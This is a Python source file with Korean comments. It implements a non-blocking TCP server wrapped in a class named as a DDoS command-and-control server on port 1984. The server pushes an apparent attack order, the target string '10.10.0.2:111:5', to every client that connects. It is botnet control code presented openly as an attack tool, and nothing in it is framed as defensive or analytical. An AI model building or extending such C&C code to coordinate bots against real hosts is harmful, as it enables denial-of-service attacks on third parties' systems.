import socket, selectors, time
from threading import Thread

"""
논블럭킹 이벤트 기반 싱글 스레드 서버 클래스
- start()시 이벤트 스레드 하나 생성
- 이벤트 스레드에서 클라이언트를 accept()하거나 recv()함
- (클라이언트별로 새로운 스레드를 생성하지 않음)
"""
class NonBlockingServer():

    def __init__(self, port: int, bind_address: str = '0.0.0.0', read_buf_size: int = 1024):
        self.port          : str = port
        self.bind_address  : str = bind_address
        self.read_buf_size : int = read_buf_size
        self.clients       : list[socket.socket] = [] # client sockets
        self.event_thread  : Thread | None = None
        self.__stop_flag = False


    def start(self, blocking: bool = False) -> bool:
        if self.event_thread:
            return False
        self.__stop_flag = False
        self.event_thread = Thread(target=self._start_server, args=(), daemon=True)
        self.event_thread.start()
        if blocking:
            self.event_thread.join()
        return True


    def stop(self) -> bool:
        if not self.event_thread:
            return False
        print('Stopping...')
        self.__stop_flag = True
        self.event_thread.join()
        print('Stopped')
        self.event_thread = None
        return True


    def broadcast(self, message: str) -> int:
        sent_cnt = 0
        for client in self.clients:
            try:
                client.send(message.encode('utf-8'))
                sent_cnt += 1
            except:
                pass
        return sent_cnt


    def _start_server(self): # non-blocking sockets with single-threaded sub-process
        sel = selectors.DefaultSelector()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.bind_address, self.port))
            sock.setblocking(False)
            sock.listen(100)
            sel.register(sock, selectors.EVENT_READ, self._accept_handler)
        except Exception as e:
            print('[-] Failed to start server.', e)
            return

        print(f'[+] Server is running on {self.bind_address}:{self.port}. (non-blocking mode)')

        while True:
            events = sel.select(timeout=1) # block
            for key, mask in events:
                callback = key.data
                callback(key.fileobj, sel)
                # callback is `self._accept_handler()` or `self._read_handler()``
            if self.__stop_flag:
                break
    
        for client in self.clients:
            client.close()
            sel.unregister(client)
        self.clients = []

        sel.unregister(sock)
        sock.close()
        print('[+] Server has been stopped.')


    def _accept_handler(self, sock: socket.socket, sel: selectors.BaseSelector):
        (new_sock, addr) = sock.accept()
        new_sock.setblocking(False)
        sel.register(new_sock, selectors.EVENT_READ, self._read_handler)
        self.clients.append(new_sock)
        (ip, port) = addr # or new_sock.getpeername()
        print(f'[+] New client connected. ({ip}:{port})')
        new_sock.send('10.10.0.2:111:5'.encode('utf-8'))


    def _read_handler(self, sock: socket.socket, sel: selectors.BaseSelector):
        try:
            (ip, port) = sock.getpeername()
            data = sock.recv(self.read_buf_size)
            if data:
                print(f'recv: {repr(data)} | {ip}:{port}')
                # sock.send(data)
                return
            # if not data: close()
        except ConnectionResetError: # Client terminated
            pass
        except Exception as e:
            print('[-] Unknown error at read_handler', e)

        self.clients.remove(sock)
        sock.close()
        sel.unregister(sock)
        print(f'[*] Client disconnected. ({ip}:{port})')




class NetForge_DDoS_CNC_Server():
    def __init__(self):
        self.server = NonBlockingServer(1984) # default port

    def start(self):
        print('[*] Start the C&C (Command & Control) server...')
        self.server.start(blocking=False)
        while True:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                self.server.stop()
                break

    def stop(self):
        self.server.stop()





if __name__ == '__main__':
    server = NetForge_DDoS_CNC_Server()
    server.start()
